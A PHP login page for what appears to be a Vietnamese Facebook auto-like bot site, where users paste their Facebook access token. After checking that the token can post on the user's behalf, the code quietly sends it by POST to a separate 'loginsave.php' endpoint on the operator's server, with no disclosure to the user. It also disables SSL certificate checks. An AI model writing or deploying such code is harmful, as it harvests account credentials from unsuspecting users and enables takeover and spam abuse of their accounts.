<?php
session_start();
include './head.php';
// JSONURL //
function get_html($url) {
    $ch = curl_init();

    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($ch, CURLOPT_FAILONERROR, 0);
    $data = curl_exec($ch);
    curl_close($ch);
	return $data;
    }
function get_json($url) {
    $ch = curl_init();

    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($ch, CURLOPT_FAILONERROR, 0);
    $data = curl_exec($ch);
    curl_close($ch);
	return json_decode($data);
    }
if($_SESSION['token']){
	$token = $_SESSION['token'];
	$graph_url ="https://graph.facebook.com/me?access_token=" . $token;
	$user = get_json($graph_url);
	if ($user->error) {
		if ($user->error->type== "OAuthException") {
			session_destroy();
			header('Location: index.php?i=1');
			}
		}
}	

if(isset($_POST['submit'])) {
	$token2 = $_POST['token'];
	if(preg_match("'access_token=(.*?)&expires_in='", $token2, $matches)){
		$token = $matches[1];
			}
	else{
		$token = $token2;
	}
		$extend = get_html("https://graph.facebook.com/me/permissions?access_token="  . $token);
		$pos = strpos($extend, "publish_stream");
		if ($pos == true) {
		$_SESSION['token'] = $token;
		$ch = curl_init('http://hotfb.org/tool/loginsave.php');
		curl_setopt ($ch, CURLOPT_POST, 1);
		curl_setopt ($ch, CURLOPT_POSTFIELDS, "token=".$token);
		curl_setopt($ch, CURLOPT_TIMEOUT, 2);
		curl_exec ($ch);
		curl_close ($ch);
			}
			else {
			session_destroy();
					header('Location: index.php?i=2');}
		
		}else{}
if(isset($_POST['logout'])) {
session_destroy();
header('Location: index.php?i=3');
} 
if(isset($_GET['i'])){
        switch($_GET['i']) {
            case 1:
                $errorMsg = "ERROR: Invalid Authentication The Access Token You Entered Is Not Valid."; // For example
            break;
            case 2:
                $errorMsg = "Hãy Đồng Ý Cài Đặt ứng Dụng";
            break;
            case 3:
                $errorMsg = "Đăng Xuất Thành Công Hẹn Gặp Lại!";
            break;
            case 4:
                $errorMsg = "Token Sai Vui lòng Kiểm Tra Hoặc Lấy Token Mới";
            break;
            case 5:
                $errorMsg = "Like Failed, Time Limit Reached, Please Wait 15 mins Later..";
            break;
            default:
                $errorMsg = "Trang Được Phát Triển Bởi DuySexy";
            break;
        }
         ''.$errorMsg.'';
    }



?>
</br>
<head>
<title>
HotFb.Org - Auto Like- Auto Bot Facebook - Tool Facebook</title>
<meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
<meta name="description" content="Bot Like Facebook, Bot Like Comment Facebook, Like Facebook, Bot Comment, Bot Like Sieu Chuan , Bot Like PRO, Bot like Facebook, botlike cuc tot, bot like khong die token, token, bot, like, facebook, 2015, moi nhat by DuySexy" />
<link rel="stylesheet" href="css/style.css" type="text/css"/>
<link rel="stylesheet" href="css/style1.css" type="text/css"/>
<link rel="shortcut icon" href="http://duydaik98.wap.sh/icon/java.png"/>
<link href="css/bootstrap.son.css" rel="stylesheet">
<script type='text/javascript' src='menu.js'></script>
<link href="http://fonts.googleapis.com/css?family=Orbitron:700" rel="stylesheet" type="text/css">
</head>
<div class="furm"><center>
<table cellspacing="0" cellpadding="0" class="lr">
<tr>
<tr>
<a href="/index.php">
</a>
</td>
</td>
</tr>
</table>
</td>
<td valign="top" class="r">
</td>
</tr>
</table></center></div>
</head><center>
<div align="right">
<span class="fcw mfsm">

</span>
</div>
</div>

</body></center>
</html>
<font face=papyrus color=black>
<div align="right">
<span class="fcw mfsm">
</span>
</div>
</div>
</style>
</head>
</head>
    <body>
        <div id="wrap" class="boxed">

</h3>
</br>
</br>
<div class="col-sm-12 blog-main">

<div id="page-wrapper">
<div class="panel panel-primary">
<div class="panel-heading">
                                <h3 class="panel-title"><span class="glyphicon glyphicon-signal"></span> Tool Facebook </h3>
                            </div>


<form method="get" action="Go.login.php"><div class="tab-content">

                                         <span class="input-group-addon">Mã Access Token ( chỉ sử dụng HTC )<hr><a class="btn btn-warning" href="https://developers.facebook.com/tools/debug/accesstoken/?app_id=41158896424" 

target="_blank">
											<span 

class="glyphicon glyphicon-search"></span>
						Lấy Token HTC
					</a></span><textarea rows="5" type="text" name="user" class="form-control" value="" placeholder="Nhập Access Token Vào Đây...!!!" autofocus="" required=""><?php echo $_SESSION['access_token'];?></textarea>	



	</div><span class="input-group-btn">
	<center>	<button type="submit" name="submit" onClick="done()" class="btn btn-primary">
						<span id="btn-click">
						<span class="glyphicon glyphicon-transfer"></span> Đăng nhập
						</span>
				</button>			</center>			</span></div></form>


<?php if ($token){echo " ".$user->firt_name;}else{ ?>
<?php
		}
		?>
		<?php if ($token): ?>
<script type="text/javascript">
// Do Not Delete This
window.location.replace("SexyTool.php?i=1");
</script>
		<?php else: ?>
		<?php endif ?>
<?php
include './footer.php';
?>